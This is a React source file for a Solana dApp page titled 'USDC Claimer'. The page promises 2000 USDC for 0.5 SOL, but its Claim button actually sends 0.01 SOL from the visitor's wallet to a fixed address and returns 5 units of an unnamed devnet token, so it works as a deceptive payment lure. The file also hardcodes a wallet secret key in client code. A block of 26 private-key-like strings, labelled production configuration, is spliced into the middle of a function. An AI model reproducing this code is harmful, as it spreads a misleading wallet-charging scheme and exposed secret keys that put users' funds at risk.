/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5UDgGBixaLno58LD3f6sLDMBxTThjBjAXTmeEYVcJkvtC9wmnvqj5vP6qtJ8y3MtQL283rDU45rJaG84obVKWBmM"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5xmM1QWBTPcNGwuZnQEBadsZVrqEP2Q1gfA519rNQ2U7qjshSwpMGQ4pfoys6VrTecC2XCtDAXtYZUWpynAifB5P",
  "key1": "XkoZrLxwFYzxoPErFLLdy6MfupS8n8aoPb45peBTnb6xp1vmmeiXYjz2QCrNz3bzr2D1d91KBMXTYvbA9pzVxtG",
  "key2": "2FCoVie8wj2RWeXV6kkh5RoHFY74RJwfZfZRNHjXz4zJgb7yiWr3hoPuW7wuv1JouJVXoShbfxeGQZbAYHWdFTs1",
  "key3": "23mzStQWATWSof8umgSSaAN8EYFckjz3CciyouH3qPLuxyqic51APcp4vGivCacHkYX9TQLy9n8x4sWXiydt3nf7",
  "key4": "4vUZEjTBU9zv5B84JohuXXStsHLk8NnTk7tfrMiettZFvtRw3Hkid3NQvAq9ukK655HESCcrXEe3BRfkmKmCufKU",
  "key5": "1CGDyi929jdktEaVvvfg5mvQgBErpi9sUwc1og9k5b2uo7CnwNXTjKtXgNF1nSVnUYb5wosTDYqdLyaxpWX93Mx",
  "key6": "RJ35wPzqkkQ54NrcdpPTpoHzhnfGoWwJxNsHgBwv3VrqpaC8P6KefKhLVmLwXMWn2LR3mQ9aDPaDouzDHu1bUte",
  "key7": "wWCPitsHiSpojyP1xkCunpxJdGhkzhGGUKeFM8Wi4zYxNq36Erxtk7W1axRMgvMWfEpFNttF6pe2Bqw98YDeaoV",
  "key8": "2EuL1GNohm4BXUAMeWo2K1fjon3hv3BJRujk5tw8igSuHQVo7dbfuHquWodfWWfXZkRzNkTmEmTKKA5J6uriY1pL",
  "key9": "2NhLd6ZjFAUG3yAwxCC8qgocRrtPkSPKokb1KsmRNi92CBsQGpuD5A4DQat3Nd6HdBSgFHmAXwzdguCGpDap7yV4",
  "key10": "3upTx43ZcVg4dLE7MpL5zNUue2qGKQ4CZL8t9YYShy3vqAJdJ7HeRZitsGUsZeytgXFZPjV61VUtgPdQwXSN63GP",
  "key11": "3YjvCDk9H92tZ4a2WPa9RCryHrtU5eTRqFvYQdK8qu76jqFgDCHQxTsJb8GNWWuCGLPEt6yt2BbZCabbFTGRsN4i",
  "key12": "2w1nRZJduT918TYcsk7yMocjFJMF7t5bjW1WHBWi4BeJYy9bL76D6FRnWrTmFWvHuQiRvj3r4rikWUMHHuerqyAd",
  "key13": "4tQzaphueHStgZ9mHWSbo9z8bw9PEj3bGPwuJH45ir8eunpDieGk59MBdrfvMuz162967XMXLj2iV1jRobuRaXgJ",
  "key14": "4nYdrMk7i9W13Ng7HHsdiwRt8oW2wFvAjCng7swuRXed9GL9SwxEbWvy9R5RkAZx54SBopi398B8ZeU2mJYDedwX",
  "key15": "4pVL369Msv6JcwNCcbN86QiwBEWVjr4MzbJue3YeZsGdbT5WY3wnt7wzhr3pCNDS37vYBf76Pgos923rAy5cZnwB",
  "key16": "2viWpsK8kLeJco9PDohGPDEddsBqASYcj7gVXxAajTxtfCybP3cyvCYGVQCuaTnK89ryhjvCGM1p3edfD2mLd3oP",
  "key17": "4tuZKcqzWc5ZGUiEy2DVxgbjuGyVoi4oVLhaqD2EeiYkMHb8z9C5YtbLLDZJGT8xcAJXQzu2zLSvhCsBdzHswKoi",
  "key18": "2M8GiEiq7Fzy7s63QrmQZ1cc1UGBaLVRdre4vA8FrXuqfAHnsjV8ydkGDVoaswsECCN22mJSaYPb5LNZzh7xfufd",
  "key19": "5UgGKvvEKXHWEinC3BX1h9BR7uc1arwCNAbYXxxNWZ5fh8jTwj5TDthnmYFYqoTE6ghekr1pJYtxkfmHrTRn8tuf",
  "key20": "4iVoy9vzZscvnRm8pjRsnitkJqNQEycFkkn3Vuj71GkyfasAgRRUV8dC28DdM151Z9SVfkYRn6RNZVsRP26YvML8",
  "key21": "5TcsRoGHmKxGXqoZgD7stJdYw1KVkYhVaZUynBKjUpByo4SVmXFVpKtn9Qo83hZEeh4sheo6ZaDUE7Cs4tiiDKpY",
  "key22": "4b6gVkFnK9ECpdsomEtVhqVQTR5WNzWwVdWHYAvSZbTLV2Vqgo3Ar6BDqyBi6yWo7GDnRcPp6zcx7NFNJTHXMaT7",
  "key23": "3qKgeDtDgkuaGRSSsKNzUyMuTWZQ7gAPtTFuZiB57dyaFFJPrs5iACFVsHPi1DJCZptaJURDCvLsfWf81SHH6H33",
  "key24": "d6WELwTnR4K2xUDH3yzLBUwukav3TFqwQB5pgQWUARfnFQvSEwCweP51DPkYeAzBMzZaUDCFiRrMgLtjXktujQa",
  "key25": "2voMDsC5tS87fiu6w5cxjvkbzUbFjm849ZcSzcmyVfcUw28FaNMfA5QQqjg7PW7dFbeNSUMN8P6wV1a6LkGSGayq"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
